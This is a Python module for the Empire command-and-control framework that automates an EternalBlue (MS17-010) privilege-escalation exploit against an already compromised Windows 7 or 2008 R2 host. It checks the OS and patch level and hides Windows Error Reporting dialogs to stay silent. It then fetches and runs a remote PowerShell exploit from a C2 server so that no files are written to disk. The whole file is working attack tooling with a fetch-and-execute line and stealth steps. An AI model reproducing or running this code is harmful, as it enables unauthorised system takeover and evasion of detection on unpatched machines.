"""
Using https://github.com/tevora-threat/eternal_blue_powershell for local EoP 
(remote exploit will crash target) 
Target requirements:
1. 64bit Windows 7 or 2008 R2 
2. Not patched
Use empire_wait_for_agent after this! Call this twice => BSOD
eb.txt does an IEX on a remote EternalBlue.ps1, gets first NIC IP & runs the exploit 
against the IP. We want to minimize files onto disk.
"""
from EmpireAPIWrapper import empireAPI
from c2_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER

def run(API, agent_name, eternalblue_url='http://empirec2:8000/eb.txt'):
    """
    Uses EternalBlue to EoP locally 
    \n:param API: EmpireAPIWrapper object
    \n:param agent_name: name of existing session
    \n:param eternalblue_url: URL to download EB powershell launcher
    \n:return type: output from EBlue PSH
    """

    # Check windows version & architecture
    findarch = """(Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture"""
    opts = {'Agent': agent_name, 'command': findarch}    
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if('64' not in results):
        print('Target is not 64bit OS')
        return None
    os_details = API.agent_info(agent_name)['agents'][0]['os_details']
    if('7' not in os_details and '2008' not in os_details):
        print('Only works for Win 7 or 2008')
        return None
    # Check if target is patched using method #2 of:
    # https://support.microsoft.com/en-sg/help/4023262/how-to-verify-that-ms17-010-is-installed
    # tested with standalone windows6.1-kb4012212-x64_2decefaa02e2058dcd965702509a992d8c4e92b3 MSU
    check_srv_sys = """$fso = new-object -comobject "Scripting.FileSystemObject"
                          $v = $fso.GetFileVersion("$env:systemroot\System32\Drivers\srv.sys")
                          [version] $v -ge [version] "6.1.7601.23689" """
    opts = {'Agent': agent_name, 'command': check_srv_sys}
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if('False' not in results):
        print('Target is patched')
        return None
    # Suppress WER error UI to make it "silent"
    opts = {'Agent': agent_name, 'command': """Set-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" -Name DontShowUI -Value 1"""}
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)    
    # Fire EternalBlue using a new powershell process, else it will crash existing agent session
    run_eb = "shell (New-Object system.net.webclient).DownloadString('" + eternalblue_url + "') |powershell -noprofile -"
    opts = {'Agent': agent_name, 'command': run_eb}
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    return results
    

if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))